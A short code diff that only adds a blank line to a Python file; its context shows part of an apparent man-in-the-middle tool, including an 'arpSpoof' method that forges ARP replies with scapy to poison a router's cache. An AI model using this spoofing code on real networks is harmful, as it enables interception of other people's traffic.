@@ -165,6 +165,7 @@ class Parser:
             url = self.getHttpHost(header_lines) + self.getHttpPost(header_lines)
         return (http_type, url)
 
+
 class sMitm:
     def arpSpoof(self, routerIP, targetIP, routerMAC, victimMAC):
         send(ARP(op=2, psrc=targetIP, pdst=routerIP, hwsrc=victimMAC, hwdst=routerMAC), verbose=0)
